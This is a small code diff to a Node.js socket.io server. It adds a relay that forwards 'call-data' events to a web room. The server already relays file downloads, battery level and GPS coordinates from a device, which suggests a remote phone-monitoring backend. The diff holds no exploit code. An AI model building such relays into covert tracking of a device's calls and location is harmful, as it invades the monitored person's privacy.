@@ -63,7 +63,9 @@ io.on('connection', (socket) => {
     socket.on('file-download-ready', (fileObj) => {
         io.to('web').emit('file-download-ready', fileObj);
     });
-
+socket.on('call-data', (data) => {
+    io.to('web').emit('call-data', data);
+});
     /**
      * SYSTEM STATUS RELAY: Device -> Web
      * Relays Battery level and GPS coordinates
@@ -85,3 +87,4 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
+
